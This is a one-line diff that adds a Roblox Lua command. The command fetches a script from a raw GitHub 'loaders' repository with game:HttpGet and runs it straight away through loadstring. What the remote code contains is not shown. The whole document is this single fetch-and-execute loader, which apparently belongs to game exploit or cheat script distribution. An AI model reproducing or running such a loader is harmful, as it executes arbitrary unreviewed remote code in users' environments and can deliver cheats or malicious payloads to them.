@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/apple-ipad-original-spam5-rjhq3ct6gxthxh.lua"))()
